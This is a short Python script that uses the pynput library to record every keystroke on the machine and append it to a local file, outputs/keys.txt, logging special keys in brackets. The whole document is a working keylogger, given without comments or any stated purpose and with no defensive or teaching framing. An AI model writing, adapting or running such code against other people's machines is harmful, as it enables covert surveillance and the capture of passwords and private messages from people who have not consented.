from pynput import keyboard

LOG_FILE = "outputs/keys.txt"

def on_press(key):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(str(key.char))
    except:
        with open(LOG_FILE, 'a') as f:
            f.write("["+str(key)+"]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
